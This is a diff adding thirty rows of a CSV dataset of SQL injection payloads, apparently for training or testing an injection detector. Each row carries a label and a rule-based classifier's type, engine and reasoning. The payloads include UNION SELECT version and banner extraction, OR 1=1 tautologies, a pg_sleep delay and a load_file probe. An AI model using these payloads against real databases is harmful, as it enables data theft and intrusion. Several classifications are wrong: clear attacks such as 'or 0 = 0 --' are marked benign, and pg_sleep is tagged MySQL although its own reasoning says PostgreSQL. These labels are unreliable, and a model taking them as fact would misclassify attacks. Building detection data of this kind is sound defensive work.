@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+450,"select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
+451,admin'or 1 = 1 or '' = ',1,,boolean_blind,generic,0.95,"or 1 = 1, 1 = 1 or detected — boolean_blind injection (priority 8) on generic",rule-based
+452,"select * from users where id = '1' or !<1 union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+453,"and 1 = ( if ( ( load_file ( char ( 110,46,101,120,11 ...",1,,out_of_band,mysql,0.95,load_file ( detected — out_of_band injection (priority 2) on mysql,rule-based
+454,exec ( @s ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+455,"select * from users where id = 1 or ""_ ) "" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+456,"select * from users where id = 1 or \.< = 1 union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+457,select * from users where id = 1 + $+%1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+458,"select * from users where id = 1. union select version ( ) ,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+459,x' AND email IS NULL; --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+460,"select * from users where id = '1' + @ @1 union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @ @1 union select detected — union_based injection (priority 7) on generic",rule-based
+461,"select * from users where id = '1' union select null,banner from v$version where rownum = 1 -- 1'",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
+462,"select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
+463,"select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
+464,update,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+465,"select * from users where id = 1.<1# union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+466,""" ) ) or pg_sleep ( __TIME__ ) --",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+467,||'6,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
+468,"select * from users where id = 1. <@ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
+469,or ( EXISTS ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+470,or 'text' = n'text',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+471,"select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+472,"select * from users where id = '1' union select $ _,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+473,"select * from users where id = 1 or "" ) ;"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+474,"select * from users where id = 1 <@1$ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @1$ union select detected — union_based injection (priority 7) on generic",rule-based
+475,or 0 = 0 --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+476,"select * from users where id = 1 or ""{1"" = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+477,"select * from users where id = 1 or ""{,"" = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+478,"select * from users where id = 1 or 1#"", union select version ( ) ,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+479,"select * from users where id = 1 or 1#""? union select 'a',version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
